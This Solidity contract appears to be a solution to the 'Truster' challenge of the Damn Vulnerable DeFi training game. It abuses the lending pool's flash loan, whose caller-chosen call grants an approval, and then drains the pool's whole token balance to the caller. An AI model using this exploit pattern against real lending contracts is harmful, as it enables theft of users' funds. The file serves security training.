import "../truster/TrusterLenderPool.sol";


contract AttackTruster {

    TrusterLenderPool _truster;
    DamnValuableToken public immutable _token;


    constructor(address truster, address tokenAddress) {
        _truster = TrusterLenderPool(truster);
        _token = DamnValuableToken(tokenAddress);
    }

    function attack(uint256 amount, address borrower, address target, bytes calldata data) external {
       _truster.flashLoan(amount, borrower, target, data);
       _token.transferFrom(address(_truster), msg.sender, _token.balanceOf(address(_truster)));
    }
}
